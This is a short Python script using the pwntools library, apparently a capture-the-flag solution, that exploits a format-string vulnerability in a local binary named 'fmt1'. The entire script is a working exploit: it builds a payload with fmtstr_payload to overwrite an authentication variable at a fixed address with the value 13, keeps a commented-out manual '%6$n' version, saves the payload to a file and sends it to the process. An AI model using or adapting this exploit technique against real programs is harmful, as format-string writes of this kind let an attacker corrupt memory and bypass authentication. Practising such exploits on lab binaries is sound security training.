from pwn import *

context.binary = ELF('./fmt1')
AUTH_ADDR = 0x404048
def solve():
    p = process()
    payload = fmtstr_payload(6, {AUTH_ADDR : 13})
    #payload = p64(AUTH_ADDR)
    #payload += b'|' * 5         # We need to write the value 13, AUTH is 8 bytes, so we need 5 more for %n
    #payload += b'%6$n'
    print("payload:", payload)
    with open('input.txt', 'wb') as f:
        f.write(payload)
    p.sendline(payload)
    log.info(p.clean())
    p.close()

solve()
